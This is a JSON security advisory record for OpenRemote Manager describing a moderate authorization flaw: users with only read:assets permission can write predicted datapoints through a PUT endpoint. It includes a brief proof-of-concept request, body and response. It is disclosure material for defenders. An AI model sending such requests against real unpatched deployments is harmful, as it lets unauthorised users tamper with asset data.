@@ -1,0 +1,53 @@
+{
+  "Severity": "MODERATE",
+  "UpdatedAt": "2026-07-06T16:52:35Z",
+  "Package": {
+    "Ecosystem": "MAVEN",
+    "Name": "io.openremote:openremote-manager"
+  },
+  "Advisory": {
+    "DatabaseId": 369500,
+    "Id": "GSA_kwCzR0hTQS14ajUzLWoyNTctaHh2Z84ABaNc",
+    "GhsaId": "GHSA-xj53-j257-hxvg",
+    "References": [
+      {
+        "Url": "https://github.com/openremote/openremote/security/advisories/GHSA-xj53-j257-hxvg"
+      },
+      {
+        "Url": "https://github.com/openremote/openremote/commit/583dbbfb96076ba099be8729ddf506acf9e48325"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-xj53-j257-hxvg"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-xj53-j257-hxvg"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-49439"
+      }
+    ],
+    "Description": "# Summary\n\nThe predicted datapoint write endpoint allows users with only `read:assets` privileges to write predicted datapoints.\n\nThe endpoint:\n\n```text\nPUT /api/{realm}/asset/predicted/{assetId}/{attributeName}\n```\n\naccepts write requests from users lacking `write:assets`.\n\nThe implementation appears to check `READ_ASSETS` while performing a write operation through:\n\n```java\nassetPredictedDatapointService.updateValues(...)\n```\n\n# PoC\n\nA user was created with only:\n\n```text\nread:assets\n```\n\nand without `write:assets`.\n\nThe following request succeeded:\n\n```http\nPUT /api/master/asset/predicted/4Fr8Pcp7iDjrEmoSUFolvT/temperature\n```\n\nRequest body:\n\n```json\n[{\"x\":1779199999001,\"y\":1337}]\n```\n\nResponse:\n\n```text\nHTTP/2 204\n```\n\nDatabase verification confirmed the datapoint was written successfully:\n\n```text\nentity_id: 4Fr8Pcp7iDjrEmoSUFolvT\nattribute_name: temperature\nvalue: 1337\n```\n\n# Impact\n\nUsers with read-only asset permissions can modify predicted datapoints for assets.",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-07-06T16:52:35Z",
+    "Severity": "MODERATE",
+    "Summary": "OpenRemote read-only asset users can write predicted datapoints",
+    "UpdatedAt": "2026-07-06T16:52:35Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 4.3,
+      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "1.24.1"
+      },
+      "VulnerableVersionRange": "\u003c 1.24.1"
+    }
+  ]
+}
